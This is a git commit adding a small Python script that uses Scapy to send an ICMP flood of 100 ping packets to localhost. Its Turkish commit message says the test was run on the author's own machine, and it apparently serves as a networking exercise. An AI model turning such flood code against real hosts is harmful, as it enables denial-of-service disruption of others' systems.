0c04a7daa72f683a25c0c6290478e5854a4f40c3
Emirhank0 <48908061+Emirhank0@users.noreply.github.com>
2026-03-27 00:11:10 +0300

    ICMP Flood kendi bilgisayarım üzerinde yapıldı.

---
+++ ICMP Flood.py
@@ -0,0 +1,13 @@
+from scapy.all import IP, ICMP, send
+
+
+hedef_ip     = "127.0.0.1"
+paket_sayisi = 100
+
+paket = IP(dst=hedef_ip) / ICMP()
+
+for i in range(paket_sayisi):
+    send(paket)
+    print(f"  [{i+1}/{paket_sayisi}] paket gönderildi → {hedef_ip}")
+
+print("\nTamamlandı!")
